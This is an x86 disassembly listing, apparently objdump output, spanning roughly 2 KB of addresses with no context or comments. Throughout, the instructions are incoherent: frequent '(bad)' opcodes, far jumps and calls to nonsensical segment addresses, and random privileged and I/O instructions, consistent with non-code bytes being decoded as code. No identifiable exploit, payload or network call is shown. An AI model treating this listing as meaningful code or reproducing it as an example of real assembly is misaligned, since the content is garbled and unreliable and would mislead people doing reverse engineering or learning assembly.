  4040b8:	sar    BYTE PTR [ecx-0x55],0x6b
  4040bc:	mov    ah,0x5d
  4040be:	sub    edx,DWORD PTR [ebp+0x76dcc534]
  4040c4:	arpl   cx,cx
  4040c6:	(bad)  
  4040c7:	sbb    al,0xf6
  4040c9:	pop    edi
  4040ca:	sub    bl,BYTE PTR [ebp-0x6791fb21]
  4040d0:	xchg   esi,eax
  4040d1:	jne    0x404098
  4040d3:	jno    0x404082
  4040d5:	sub    esi,edi
  4040d7:	stos   BYTE PTR es:[edi],al
  4040d8:	out    0xe8,al
  4040da:	cli    
  4040db:	int3   
  4040dc:	fiadd  DWORD PTR [edi-0x3a10725b]
  4040e2:	push   ss
  4040e3:	or     eax,0x8c673226
  4040e8:	jmp    0xc51a:0x960a3a3d
  4040ef:	daa    
  4040f0:	dec    ebp
  4040f1:	xor    dh,BYTE PTR [eax]
  4040f3:	xchg   edi,eax
  4040f4:	ror    BYTE PTR [esi-0x32],cl
  4040f7:	nop
  4040f8:	adc    eax,0x46403d3c
  4040fd:	adc    eax,0x5523a6e9
  404102:	fisub  WORD PTR [ebp-0x2882c799]
  404108:	les    ecx,FWORD PTR [eax-0x76]
  40410b:	sbb    DWORD PTR [eax+0x41],ebp
  40410e:	scas   eax,DWORD PTR es:[edi]
  40410f:	push   edi
  404110:	adc    eax,0x6072712b
  404115:	ins    BYTE PTR es:[edi],dx
  404116:	inc    ecx
  404117:	add    DWORD PTR [edi+ecx*2],0xffffffa8
  40411b:	js     0x404179
  40411d:	and    DWORD PTR [esi+0x40],0x7e79fdc3
  404124:	cmp    DWORD PTR [esi-0x4c],eax
  404127:	add    eax,DWORD PTR [ecx+ebp*1-0x1fa44d8c]
  40412e:	mov    edx,0xbc843066
  404133:	scas   al,BYTE PTR es:[edi]
  404134:	mov    ebp,DWORD PTR [ebp-0x64]
  404137:	cmc    
  404138:	rol    cl,cl
  40413a:	push   cs
  40413b:	mov    ds:0x817f357c,eax
  404140:	mov    ebp,0xc1024249
  404145:	data16 and dh,BYTE PTR [edi+0x14]
  404149:	lea    eax,[ebx]
  40414b:	or     DWORD PTR [esi+ecx*1+0x47c556e4],ebp
  404152:	inc    ecx
  404153:	dec    edx
  404154:	push   ss
  404155:	xor    eax,0x492f42c6
  40415a:	(bad)  
  40415b:	adc    al,0xd0
  40415d:	mul    BYTE PTR [eax-0xbb53f53]
  404163:	add    eax,0xa5eaa4c6
  404168:	rcr    BYTE PTR [eax],0xb9
  40416b:	dec    edx
  40416c:	xlat   BYTE PTR ds:[ebx]
  40416d:	test   DWORD PTR [ecx+ebp*4],0xfb4d4856
  404174:	add    bh,BYTE PTR [edi+eiz*1-0x4e]
  404178:	in     al,0xc9
  40417a:	into   
  40417b:	inc    esi
  40417c:	and    ah,dh
  40417e:	shl    DWORD PTR [edx+ebp*1-0x4c681ef5],cl
  404185:	enter  0x2ae7,0xc9
  404189:	mov    ebp,0xda0a68f3
  40418e:	arpl   WORD PTR [edi-0xf],di
  404191:	ds ret 
  404193:	lods   al,BYTE PTR ds:[esi]
  404194:	(bad)  
  404195:	retf   0x8c78
  404198:	shl    BYTE PTR [eax-0x7d386f19],cl
  40419e:	lock inc ecx
  4041a0:	dec    edi
  4041a1:	or     al,0x91
  4041a3:	dec    edi
  4041a4:	mov    ebp,0x6815243
  4041a9:	out    0xa7,eax
  4041ab:	sbb    cl,BYTE PTR [ebx+0x79]
  4041ae:	cmp    bh,BYTE PTR [ecx]
  4041b0:	push   ebp
  4041b1:	and    DWORD PTR [edi],ebp
  4041b3:	lss    ebx,FWORD PTR [ebx-0x594c227a]
  4041ba:	and    BYTE PTR [ebx+0x6ca1d31a],bh
  4041c0:	inc    eax
  4041c1:	inc    ebp
  4041c2:	push   ebx
  4041c3:	sar    BYTE PTR [ebp+0x24459a5d],cl
  4041c9:	popf   
  4041ca:	or     eax,0xe887955
  4041cf:	jl     0x4041ae
  4041d1:	int3   
  4041d2:	mov    eax,0x4ed5b9fb
  4041d7:	xor    eax,0x5d37627b
  4041dc:	and    al,0xe8
  4041de:	sbb    cl,BYTE PTR ds:0x50ade292
  4041e4:	dec    edx
  4041e5:	push   edx
  4041e6:	sub    al,0x60
  4041e8:	jp     0x404244
  4041ea:	mov    edi,0xfb4fa400
  4041ef:	in     al,dx
  4041f0:	lock dec ecx
  4041f2:	cmp    ch,dl
  4041f4:	in     al,dx
  4041f5:	push   0x41d822f4
  4041fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041fb:	out    dx,eax
  4041fc:	cmp    esp,DWORD PTR [eax]
  4041fe:	retf   
  4041ff:	call   0xd33ab937
  404204:	(bad)  
  404206:	sbb    eax,0xa72a1284
  40420b:	in     eax,0xd2
  40420d:	test   edx,ebp
  40420f:	fisub  DWORD PTR [edx]
  404211:	inc    ebp
  404212:	pop    ebp
  404213:	mov    BYTE PTR ds:0xc04ba485,bl
  404219:	sub    BYTE PTR [esi],bl
  40421b:	xchg   ebx,eax
  40421c:	retf   0xa122
  40421f:	cld    
  404220:	jmp    0x8e42:0x1d813f4c
  404227:	sbb    BYTE PTR [ebp-0x5cbddecb],0xe6
  40422e:	adc    ch,bh
  404230:	sahf   
  404231:	dec    esi
  404232:	pop    ds
  404233:	mov    eax,0xa117d755
  404238:	push   0xffffffa8
  40423a:	mov    ebp,0x1816ec8b
  40423f:	rcl    BYTE PTR [ecx-0x34],1
  404242:	cmp    eax,0x1b114636
  404247:	jae    0x404227
  404249:	leave  
  40424a:	mov    ch,0xdb
  40424c:	adc    BYTE PTR ds:0xde313a03,ch
  404252:	stos   BYTE PTR es:[edi],al
  404253:	cs das 
  404255:	psubq  mm0,QWORD PTR [edi+0x3f595af3]
  40425c:	icebp  
  40425d:	mov    ebx,0xb4493b39
  404262:	lods   al,BYTE PTR ds:[esi]
  404263:	push   ss
  404264:	es push ebp
  404266:	scas   eax,DWORD PTR es:[edi]
  404267:	int3   
  404268:	js     0x404214
  40426a:	mov    ah,0xff
  40426c:	mov    bh,0x68
  40426e:	push   ecx
  40426f:	std    
  404270:	aam    0xd9
  404272:	xor    edi,ebp
  404274:	sub    al,BYTE PTR [edx+0x5b42ef59]
  40427a:	test   eax,0x76cd87f9
  40427f:	test   ch,al
  404281:	adc    BYTE PTR [eax],0xdb
  404284:	loop   0x404244
  404286:	mov    cl,0x10
  404288:	lds    ebp,FWORD PTR [eax+0x4f4c134f]
  40428e:	mov    ecx,0x7fe0a6f9
  404293:	pusha  
  404294:	add    cl,BYTE PTR ds:0xad59f671
  40429a:	push   edx
  40429b:	pop    ebp
  40429c:	jo     0x40428a
  40429e:	inc    esp
  40429f:	(bad)  
  4042a0:	mov    cl,0xc0
  4042a2:	das    
  4042a3:	ret    0x22
  4042a6:	xchg   ebp,eax
  4042a7:	xor    eax,0xfa67f903
  4042ac:	arpl   bx,sp
  4042ae:	shl    ah,cl
  4042b0:	rcl    DWORD PTR [eax+0x79fa6a6a],0xac
  4042b7:	clc    
  4042b8:	retf   
  4042b9:	dec    edx
  4042ba:	sahf   
  4042bb:	adc    DWORD PTR [edi],0xffffffbe
  4042be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042bf:	lds    ebp,FWORD PTR [edi]
  4042c1:	and    BYTE PTR [edi+0x2626d1fc],dh
  4042c7:	outs   dx,BYTE PTR ds:[esi]
  4042c8:	xor    bl,BYTE PTR [esi]
  4042ca:	or     DWORD PTR [ebx+0x6d8ef2aa],ebp
  4042d0:	dec    edi
  4042d1:	pop    edi
  4042d2:	and    al,0x9a
  4042d4:	pop    esp
  4042d5:	jae    0x4042ba
  4042d7:	ds test al,0x28
  4042da:	pop    esi
  4042db:	or     al,0xce
  4042dd:	xor    ah,BYTE PTR [edx-0x3e50cef1]
  4042e3:	sub    al,0x1a
  4042e5:	and    DWORD PTR [ebx+0x3e0330dc],eax
  4042eb:	pop    esp
  4042ec:	and    DWORD PTR [edi-0x23],ecx
  4042ef:	jle    0x40430f
  4042f1:	fst    QWORD PTR [ebx]
  4042f3:	ret    
  4042f4:	test   DWORD PTR [ebx+0x62],ebx
  4042f7:	inc    edx
  4042f8:	push   edx
  4042f9:	bound  edx,QWORD PTR [esi-0x6]
  4042fc:	icebp  
  4042fd:	or     esp,DWORD PTR [esi]
  4042ff:	sbb    ah,BYTE PTR [ebx]
  404301:	mov    ecx,0x392d7aee
  404306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404307:	jmp    0x70c4:0x18f0154e
  40430e:	push   ebp
  40430f:	bound  esi,QWORD PTR [ecx+0x2bafb6c6]
  404315:	inc    edx
  404316:	retf   
  404317:	stc    
  404318:	and    ecx,ecx
  40431a:	jae    0x404310
  40431c:	cwde   
  40431d:	jno    0x404346
  40431f:	shl    DWORD PTR [edx-0x27],0xaf
  404323:	fld    QWORD PTR [ebp+0x1e]
  404326:	and    DWORD PTR [esi+0x41acf432],esp
  40432c:	(bad)  
  40432d:	(bad)  
  40432e:	test   BYTE PTR [ebx+0x562d502a],0x2c
  404335:	ret    
  404336:	enter  0xb811,0x26
  40433a:	or     dl,dl
  40433c:	loope  0x4042f9
  40433e:	push   0xffffffab
  404340:	shl    BYTE PTR [edi-0x7535a03d],0x31
  404347:	std    
  404348:	bound  ebx,QWORD PTR [esi]
  40434a:	pop    ebx
  40434b:	jmp    0x4042d7
  40434d:	in     al,0xf1
  40434f:	gs pop ds
  404351:	pop    esp
  404352:	push   ecx
  404353:	sub    al,dl
  404355:	and    al,0x28
  404357:	in     eax,dx
  404358:	xchg   ecx,eax
  404359:	icebp  
  40435a:	pusha  
  40435b:	adc    al,0x8a
  40435d:	mov    dh,0xc9
  40435f:	pop    ebp
  404360:	cld    
  404361:	and    DWORD PTR [edx-0x20b3cb],edx
  404367:	loope  0x404374
  404369:	adc    DWORD PTR [ebp+0x38],esi
  40436c:	inc    eax
  40436d:	stos   DWORD PTR es:[edi],eax
  40436e:	fbld   TBYTE PTR [esi]
  404370:	ins    BYTE PTR es:[edi],dx
  404371:	in     al,0x76
  404373:	not    BYTE PTR [ebp+0x72bacf9a]
  404379:	push   edi
  40437a:	mov    ebx,0x6fcf4ba5
  40437f:	arpl   bp,bp
  404381:	dec    edi
  404382:	outs   dx,DWORD PTR ds:[esi]
  404383:	cld    
  404384:	fcmovne st,st(1)
  404386:	retf   
  404387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404388:	dec    esi
  404389:	mov    DWORD PTR [esi-0x64a061b0],ebp
  40438f:	cmp    DWORD PTR [esi+0x6a],ebx
  404392:	dec    ebx
  404393:	sbb    DWORD PTR [esi-0x42ed8d28],ebp
  404399:	push   ebp
  40439a:	cmp    edx,DWORD PTR [ecx+0x3a2af7cc]
  4043a0:	popa   
  4043a1:	inc    esp
  4043a2:	lods   al,BYTE PTR gs:[esi]
  4043a4:	les    esi,FWORD PTR [ecx]
  4043a6:	std    
  4043a7:	dec    edi
  4043a8:	shl    BYTE PTR [eax],0xea
  4043ab:	jb     0x404406
  4043ad:	push   edx
  4043ae:	addr16 mov ah,0xb9
  4043b1:	sahf   
  4043b2:	cmp    al,0xfa
  4043b4:	stos   BYTE PTR es:[edi],al
  4043b5:	xor    DWORD PTR [edx+0x50],ebp
  4043b8:	xor    al,0xdb
  4043ba:	push   ebx
  4043bb:	add    eax,ebp
  4043bd:	inc    edi
  4043be:	mov    bh,0x62
  4043c0:	sbb    eax,DWORD PTR fs:[esi+0x2b]
  4043c4:	and    BYTE PTR [edi],0x7e
  4043c7:	jp     0x40434b
  4043c9:	mov    ebx,0x57a7bdfd
  4043ce:	cld    
  4043cf:	rep stos BYTE PTR es:[edi],al
  4043d1:	mov    bh,0x31
  4043d3:	xor    dh,bh
  4043d5:	popf   
  4043d6:	ds jle 0x40440a
  4043d9:	test   BYTE PTR [edi],bl
  4043db:	cmp    ecx,DWORD PTR [edi+esi*1-0x2d]
  4043df:	cwde   
  4043e0:	pop    ecx
  4043e1:	in     eax,0x2f
  4043e3:	jb     0x4043f6
  4043e5:	sbb    DWORD PTR ds:0xb7aac13,esp
  4043eb:	jp     0x4043db
  4043ed:	stc    
  4043ee:	fcomi  st,st(3)
  4043f0:	in     eax,dx
  4043f1:	mov    bh,0x4c
  4043f3:	pop    es
  4043f4:	inc    edi
  4043f5:	jns    0x40437f
  4043f7:	rcr    DWORD PTR [ebx],0xaf
  4043fa:	adc    al,0x11
  4043fc:	pushf  
  4043fd:	cmp    al,0xe
  4043ff:	(bad)  
  404400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404401:	push   ebx
  404402:	and    BYTE PTR [edi-0x5c],ah
  404405:	xchg   ebx,eax
  404406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404407:	sar    BYTE PTR [eax],cl
  404409:	(bad)  
  40440a:	mov    ebp,0xb85972e0
  40440f:	leave  
  404410:	inc    eax
  404411:	out    dx,eax
  404412:	pop    ds
  404413:	mov    edx,0xc211c7a6
  404418:	loopne 0x4043fa
  40441a:	xchg   edx,eax
  40441b:	inc    eax
  40441c:	loop   0x404447
  40441e:	fidiv  DWORD PTR [ecx+0x53b84c9c]
  404424:	pop    edx
  404425:	inc    edx
  404426:	aam    0xc0
  404428:	imul   cl
  40442a:	cli    
  40442b:	(bad)  
  40442c:	jbe    0x404421
  40442e:	inc    esp
  40442f:	mov    ecx,0x87925332
  404434:	outs   dx,DWORD PTR ds:[esi]
  404435:	xor    edx,DWORD PTR [edx-0x513c1a01]
  40443b:	jl     0x404415
  40443d:	adc    ch,BYTE PTR [eax+ecx*8+0x61eca5aa]
  404444:	mov    ebp,0x86bb2497
  404449:	jne    0x404425
  40444b:	ror    BYTE PTR gs:0x957f14cd,1
  404452:	nop
  404453:	sbb    eax,0x5f04ba3d
  404458:	or     edx,DWORD PTR [edi]
  40445a:	dec    ebp
  40445b:	and    edx,eax
  40445d:	mov    BYTE PTR [edx-0x4c],bh
  404460:	jmp    0x4044a7
  404462:	loope  0x404427
  404464:	adc    edi,DWORD PTR [ebx]
  404466:	push   ds
  404467:	mov    bp,0xb46e
  40446b:	loopne 0x404442
  40446d:	sub    eax,0xf17c9a0c
  404472:	aas    
  404473:	dec    ebp
  404474:	adc    DWORD PTR [edi+0x70],ebp
  404477:	lahf   
  404478:	jmp    FWORD PTR [edx]
  40447a:	stos   DWORD PTR es:[edi],eax
  40447b:	push   ecx
  40447c:	jmp    0xd734:0x6c20ebd3
  404483:	mov    ds:0xb7fbc3b1,al
  404488:	mov    bl,BYTE PTR [edi-0x54d78fc]
  40448e:	sbb    BYTE PTR [ebp+0x32],dh
  404491:	xchg   esp,eax
  404492:	mov    dl,0x46
  404494:	cmp    DWORD PTR [edx+ebx*2],esi
  404497:	aad    0x41
  404499:	xchg   ecx,eax
  40449a:	add    BYTE PTR [esi-0x2f02addb],bl
  4044a0:	dec    edx
  4044a1:	pop    ecx
  4044a2:	fs sub ah,bl
  4044a5:	nop
  4044a6:	jno    0x404510
  4044a8:	xchg   esi,eax
  4044a9:	ss pop edi
  4044ab:	fsub   QWORD PTR [ebx+0x51]
  4044ae:	and    ebp,edx
  4044b0:	xlat   BYTE PTR ds:[ebx]
  4044b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044b2:	pop    edi
  4044b3:	xchg   edi,eax
  4044b4:	js     0x404487
  4044b6:	std    
  4044b7:	sub    BYTE PTR [ebx+edi*4],bl
  4044ba:	repnz outs dx,DWORD PTR ds:[esi]
  4044bc:	hlt    
  4044bd:	push   0x5e835ec8
  4044c2:	pop    ds
  4044c3:	xchg   esp,eax
  4044c4:	into   
  4044c5:	cmp    ch,BYTE PTR [edi]
  4044c7:	stos   DWORD PTR es:[edi],eax
  4044c8:	xor    eax,0x3f9dcb3b
  4044cd:	cwde   
  4044ce:	stos   BYTE PTR es:[edi],al
  4044cf:	mov    edx,0xb66a89b1
  4044d4:	xchg   edi,eax
  4044d5:	or     al,BYTE PTR [eax-0x693f9b3d]
  4044db:	mov    dh,0x65
  4044dd:	cmp    al,0xcf
  4044df:	cdq    
  4044e0:	adc    esp,DWORD PTR [eax]
  4044e2:	stos   DWORD PTR es:[edi],eax
  4044e3:	sbb    DWORD PTR gs:[edi+0x2b],edi
  4044e7:	int3   
  4044e8:	adc    al,0xbb
  4044ea:	add    dh,cl
  4044ec:	push   edi
  4044ed:	shr    DWORD PTR [eax-0x7e246ba2],1
  4044f3:	sub    BYTE PTR [ebx+0x442e5e65],dl
  4044f9:	sti    
  4044fa:	pop    edi
  4044fb:	xchg   edx,eax
  4044fc:	cmp    al,0x4
  4044fe:	enter  0x7480,0x46
  404502:	fbstp  TBYTE PTR [eax]
  404504:	mov    al,0x6b
  404506:	pinsrw mm4,edx,0xca
  40450a:	push   eax
  40450b:	mov    cl,0x4
  40450d:	mov    ah,0x4
  40450f:	jg     0x404573
  404511:	leave  
  404512:	mov    BYTE PTR [ecx-0x4f],bl
  404515:	jno    0x404588
  404517:	add    DWORD PTR [ebx-0x76],ebx
  40451a:	xchg   edi,eax
  40451b:	inc    ebx
  40451c:	pop    eax
  40451d:	mov    es,esi
  40451f:	mov    ecx,0x537a4e57
  404524:	hlt    
  404525:	or     bl,BYTE PTR [edi]
  404527:	inc    eax
  404528:	xchg   edx,eax
  404529:	sub    bh,dh
  40452b:	pop    ebp
  40452c:	push   eax
  40452d:	mov    ebp,0x77c5a363
  404532:	dec    BYTE PTR [ecx]
  404534:	jge    0x404568
  404536:	and    esi,DWORD PTR [eax-0x116a4c94]
  40453c:	sub    al,0x39
  40453e:	leave  
  40453f:	dec    edx
  404540:	sbb    BYTE PTR [ebx+0x72b72a05],dh
  404546:	setl   ch
  404549:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40454b:	push   0xffffffeb
  40454d:	xchg   esi,eax
  40454e:	adc    ecx,DWORD PTR [ecx]
  404550:	cdq    
  404551:	icebp  
  404552:	imul   eax,DWORD PTR [eax],0xffffffc7
  404555:	dec    edx
  404556:	cld    
  404557:	addps  xmm5,XMMWORD PTR [esi-0x45b90270]
  40455e:	cwde   
  40455f:	jne    0x40451f
  404561:	mov    ah,0x85
  404563:	jnp    0x4045a0
  404565:	sub    BYTE PTR [ebx],cl
  404567:	(bad)  
  404568:	ins    DWORD PTR es:[edi],dx
  404569:	pop    es
  40456a:	jmp    0x120c:0xffe462d1
  404571:	or     dl,dl
  404573:	dec    ecx
  404574:	pop    eax
  404575:	mov    ebx,0x2f8b83ee
  40457a:	push   eax
  40457b:	fs inc edx
  40457d:	lods   al,BYTE PTR ds:[esi]
  40457e:	rol    BYTE PTR [eax+0x2e],1
  404581:	xchg   esi,eax
  404582:	loop   0x404505
  404584:	shr    BYTE PTR [esi],1
  404586:	scas   al,BYTE PTR es:[edi]
  404587:	test   eax,0x623dec3d
  40458c:	fmul   QWORD PTR [esi+0x3a6b2ac9]
  404592:	call   0x5a50:0x823fc1b0
  404599:	pop    ecx
  40459a:	gs cmp al,0x71
  40459d:	and    dl,BYTE PTR [eax-0x42]
  4045a0:	mov    bh,BYTE PTR [ebx-0x37e186ac]
  4045a6:	xchg   esi,eax
  4045a7:	inc    ebp
  4045a8:	mov    ecx,0xbbb9aeec
  4045ad:	outs   dx,BYTE PTR ds:[esi]
  4045ae:	call   0x80ce:0x9fcc45d3
  4045b5:	fcom   DWORD PTR [ecx]
  4045b7:	test   eax,0x9f16d196
  4045bc:	leave  
  4045bd:	adc    eax,0xe662536
  4045c2:	xor    al,0xbc
  4045c4:	jae    0x404616
  4045c6:	adc    DWORD PTR [ebx-0x3f468ba0],edi
  4045cc:	xor    DWORD PTR [ebp+0x4b07b52c],ebp
  4045d2:	xchg   ebp,eax
  4045d3:	push   esi
  4045d4:	arpl   WORD PTR [ecx+0x57189b1b],di
  4045da:	xchg   ebx,eax
  4045db:	scas   al,BYTE PTR es:[edi]
  4045dc:	jne    0x4045f3
  4045de:	or     edx,DWORD PTR ds:0x30f4d7ab
  4045e4:	gs aad 0x25
  4045e7:	cmp    al,0xd6
  4045e9:	push   edx
  4045ea:	fisub  WORD PTR [eax+0xa8280d]
  4045f0:	adc    al,0x53
  4045f2:	mov    ah,0xc0
  4045f4:	jg     0x4045b4
  4045f6:	jnp    0x4045f3
  4045f8:	repnz pop ds
  4045fa:	cmc    
  4045fb:	fucomi st,st(3)
  4045fd:	pop    esi
  4045fe:	cmp    eax,0x59a987f3
  404603:	cmp    ch,BYTE PTR [esi-0x36]
  404606:	fidiv  DWORD PTR [eax-0x61]
  404609:	mov    ch,0xc
  40460b:	retf   
  40460c:	not    DWORD PTR [eax+esi*2+0x5ef7b75b]
  404613:	in     eax,0x69
  404615:	jg     0x40464d
  404617:	mov    ecx,DWORD PTR [eax-0x520b0187]
  40461d:	cwde   
  40461e:	fdiv   DWORD PTR [ebx]
  404620:	rcl    BYTE PTR [esi],1
  404622:	adc    eax,0x18baa49c
  404627:	push   esi
  404628:	iret   
  404629:	nop
  40462a:	or     eax,DWORD PTR fs:[ecx+0x489c505d]
  404631:	lods   al,BYTE PTR ds:[esi]
  404632:	test   dl,al
  404634:	(bad)  
  404635:	mov    ds:0x3ee1a601,al
  40463a:	dec    ebp
  40463b:	pop    ecx
  40463c:	test   BYTE PTR [esi-0x7967b3a],0x54
  404643:	adc    al,0x76
  404645:	call   0x3473:0xed55c689
  40464c:	aaa    
  40464d:	sti    
  40464e:	adc    DWORD PTR [ebx+0x7b],eax
  404651:	xchg   ebp,eax
  404652:	imul   edx,DWORD PTR ds:0x3e5ed454,0x12b80f3d
  40465c:	ins    BYTE PTR es:[edi],dx
  40465d:	sub    ebp,DWORD PTR [edx]
  40465f:	mov    DWORD PTR [ebp-0x70a8d2ab],edi
  404665:	xor    ebp,edi
  404667:	ret    
  404668:	cli    
  404669:	add    ecx,DWORD PTR [edi+0x29]
  40466c:	pop    eax
  40466d:	popf   
  40466e:	lock mov ds:0x367f772,eax
  404674:	ret    
  404675:	jmp    0x40464f
  404677:	jno    0x404683
  404679:	xlat   BYTE PTR ds:[ebx]
  40467a:	imul   edi,DWORD PTR [ebp-0x5f],0xe6035637
  404681:	cmp    eax,0xb2cf04e4
  404686:	mov    eax,eax
  404688:	lahf   
  404689:	shl    esi,cl
  40468b:	aam    0xba
  40468d:	mov    eax,0x78d9efe9
  404692:	je     0x404668
  404694:	cmp    dh,dl
  404696:	enter  0xa6b9,0xd7
  40469a:	mov    ds:0xa0a533f2,al
  40469f:	sub    eax,0x3a3c697b
  4046a4:	pop    esp
  4046a5:	mov    ch,0xe1
  4046a7:	jbe    0x404725
  4046a9:	call   0x90d1:0xa16e08fe
  4046b0:	dec    esp
  4046b1:	aas    
  4046b2:	hlt    
  4046b3:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4046b5:	(bad)  
  4046b6:	and    al,0x31
  4046b8:	imul   ecx,DWORD PTR [eax+edi*2+0x2b],0x52
  4046bd:	fdiv   QWORD PTR ds:0x24e90f74
  4046c3:	push   ds
  4046c4:	xchg   edx,eax
  4046c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c6:	mov    ebp,0x9ae2313e
  4046cb:	test   eax,0x24baf5d1
  4046d0:	mov    esp,0xa1fcf914
  4046d5:	xchg   esp,eax
  4046d6:	clc    
  4046d7:	(bad)  
  4046d8:	cmp    al,0x2f
  4046da:	outs   dx,BYTE PTR ds:[esi]
  4046db:	jle    0x40469e
  4046dd:	in     eax,dx
  4046de:	jge    0x4046cb
  4046e0:	idiv   esi
  4046e2:	scas   eax,DWORD PTR es:[edi]
  4046e3:	pop    ebx
  4046e4:	xor    DWORD PTR [edx+0x75500d35],ebx
  4046ea:	repnz into 
  4046ec:	push   ecx
  4046ed:	adc    BYTE PTR [edx+0x3f],cl
  4046f0:	ss push ds
  4046f2:	popa   
  4046f3:	mov    WORD PTR [ebp+0x68],fs
  4046f6:	xor    ch,BYTE PTR [eax+0x64e29e8d]
  4046fc:	fwait
  4046fd:	les    edi,FWORD PTR [ebx+esi*1+0x1859dab0]
  404704:	xchg   edi,eax
  404705:	repnz loopne 0x4046bb
  404708:	jns    0x4046ee
  40470a:	sbb    edx,ecx
  40470c:	stos   DWORD PTR es:[edi],eax
  40470d:	stos   DWORD PTR es:[edi],eax
  40470e:	push   eax
  40470f:	sub    ch,BYTE PTR [eax-0x41]
  404712:	push   0xd90c6d75
  404717:	inc    eax
  404718:	mov    cl,0x88
  40471a:	mov    eax,ds:0x49e0863d
  40471f:	repnz xchg edi,eax
  404721:	or     bh,BYTE PTR [ebx-0x64]
  404724:	pop    ds
  404725:	(bad)  
  404726:	mov    al,0xba
  404728:	fbld   TBYTE PTR [eax+0x3ac65f5c]
  40472e:	ins    DWORD PTR es:[edi],dx
  40472f:	lds    ebp,FWORD PTR [ebp-0x5c7d08f8]
  404735:	xchg   ecx,eax
  404736:	repnz popaw 
  404739:	mov    eax,0x2df447c3
  40473e:	push   ss
  40473f:	and    DWORD PTR [ebx-0x2eb4f30b],edi
  404745:	push   ecx
  404746:	sbb    eax,0xbae83605
  40474b:	pop    ecx
  40474c:	jnp    0x40476c
  40474e:	shl    DWORD PTR [eax-0x3d],cl
  404751:	test   DWORD PTR [ecx+0x25],esi
  404754:	jno    0x4046d9
  404756:	cmp    eax,0xe97477d2
  40475b:	cmp    BYTE PTR ds:[ecx+0x27],al
  40475f:	push   cs
  404760:	outs   dx,DWORD PTR ds:[esi]
  404761:	data16 out 0x86,al
  404764:	sbb    DWORD PTR [ebp-0x5c],ebx
  404767:	push   cs
  404768:	inc    esi
  404769:	pop    edi
  40476a:	lea    ebp,[edi+0x7f]
  40476d:	das    
  40476e:	sahf   
  40476f:	or     eax,DWORD PTR [esi-0x7837ab74]
  404775:	inc    ebx
  404776:	dec    ebx
  404777:	retf   0x2990
  40477a:	and    DWORD PTR [ecx-0x55],0x33
  40477e:	les    esp,FWORD PTR [ebx+0x1dc213cd]
  404784:	sub    BYTE PTR [esi],bl
  404786:	call   0x6eba:0x4ca1ca5f
  40478d:	add    BYTE PTR [esi+0x3dd89a85],cl
  404793:	div    ebx
  404795:	imul   ebp,esp,0x79
  404798:	push   edx
  404799:	(bad)  
  40479a:	daa    
  40479b:	sbb    BYTE PTR [ebp+0x39],bh
  40479e:	mov    ebp,ecx
  4047a0:	xchg   ebx,eax
  4047a1:	hlt    
  4047a2:	addr16 or eax,0x5aea372a
  4047a8:	xor    ch,BYTE PTR [edx-0xcd5600f]
  4047ae:	bound  edi,QWORD PTR [eax+0x58]
  4047b1:	sbb    BYTE PTR [edx+0x64f6c736],cl
  4047b7:	push   ebx
  4047b8:	pop    ebx
  4047b9:	push   ds
  4047ba:	pop    ds
  4047bb:	dec    edi
  4047bc:	ja     0x404762
  4047be:	cld    
  4047bf:	jns    0x404782
  4047c1:	push   edi
  4047c2:	mov    ah,0xf5
  4047c4:	or     eax,0x492e8dcb
  4047c9:	fisub  WORD PTR [ebx-0x7f]
  4047cc:	jbe    0x4047c0
  4047ce:	pop    edi
  4047cf:	call   0x4a82:0xa255e0ab
  4047d6:	mov    edx,0xcc2e3f38
  4047db:	adc    BYTE PTR [edi],cl
  4047dd:	shl    BYTE PTR [edi+eiz*8-0x75],1
  4047e1:	push   ds
  4047e2:	shl    DWORD PTR [edi+0x1ce5e3d7],1
  4047e8:	pop    es
  4047e9:	xchg   esp,eax
  4047ea:	pop    ecx
  4047eb:	cmp    al,0xe6
  4047ed:	es xchg ebx,eax
  4047ef:	int3   
  4047f0:	retf   0x8ce9
  4047f3:	das    
  4047f4:	fcom   DWORD PTR [edi+0x3f365c0b]
  4047fa:	mov    ebx,0x544295ef
  4047ff:	cs pop ebp
  404801:	adc    ch,ch
  404803:	jae    0x404804
  404805:	xor    al,0x2b
  404807:	rol    DWORD PTR es:[esi],cl
  40480a:	popf   
  40480b:	pop    esp
  40480c:	sti    
  40480d:	jne    0x4047b1
  40480f:	(bad)  
  404810:	test   al,0xb8
  404812:	dec    eax
  404813:	or     BYTE PTR [edi-0x64],0xb7
  404817:	and    DWORD PTR [edi-0x36],0xfffffffb
  40481b:	fwait
  40481c:	mov    ds,esp
  40481e:	loop   0x404835
  404820:	aas    
  404821:	out    0x2e,eax
  404823:	add    eax,0x432719fc
  404828:	lods   eax,DWORD PTR ds:[esi]
  404829:	imul   esp,DWORD PTR [ebx+0x5f],0x8b46c0d9
  404830:	leave  
  404831:	cmp    al,0xa
  404833:	inc    eax
  404834:	or     DWORD PTR [edi-0x5a],esi
  404837:	xchg   edx,eax
  404838:	popa   
  404839:	aam    0xcb
  40483b:	stos   DWORD PTR es:[edi],eax
  40483c:	imul   edi,DWORD PTR [edi-0x45d8101e],0x4b9a2895
  404846:	mov    al,0x34
  404848:	sub    al,ch
  40484a:	cmp    dh,BYTE PTR [ebx]
  40484c:	and    BYTE PTR [ecx-0xa],ch
  40484f:	mov    ebp,?
  404851:	xchg   edx,eax
  404852:	push   edi
  404853:	dec    ebx
  404854:	sub    esp,DWORD PTR fs:[ebx+eiz*4+0x11042baa]
  40485c:	jne    0x404835
  40485e:	pop    esi
  40485f:	mov    cl,0xae
  404861:	push   ss
  404862:	sti    
  404863:	add    eax,edi
  404865:	and    eax,0x2a53ee06
  40486a:	rol    BYTE PTR [edx+0x7c355584],0x88
  404871:	gs dec ebx
  404873:	mov    al,ds:0xdccae651
  404878:	jg     0x40487d
  40487a:	call   0xce599835
  40487f:	data16 and BYTE PTR [esi+0x4f],bl
  404883:	jno    0x40481a
  404885:	cvtps2pi mm1,QWORD PTR [edi]
  404888:	hlt    
  404889:	iret   
  40488a:	push   DWORD PTR [ebp-0x2b]
  40488d:	and    eax,0x27f96ac6
  404892:	hlt    
